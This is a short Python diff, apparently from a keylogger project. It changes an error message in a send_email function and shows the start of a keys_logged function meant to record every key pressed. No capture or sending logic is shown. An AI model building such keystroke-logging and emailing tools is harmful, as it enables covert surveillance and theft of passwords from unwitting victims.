@@ -45,7 +45,7 @@ def send_email():
         s.quit()
         return "successfull"
     except Exception as e:
-        print(f"Error sending email to malikhaziq93@gmail.com: {e}")
+        print(f"Error sending email to {reciever_email}: {e}")
         return "failed"
 
 def keys_logged():      # it will gather the whole keys pressed in a particular time
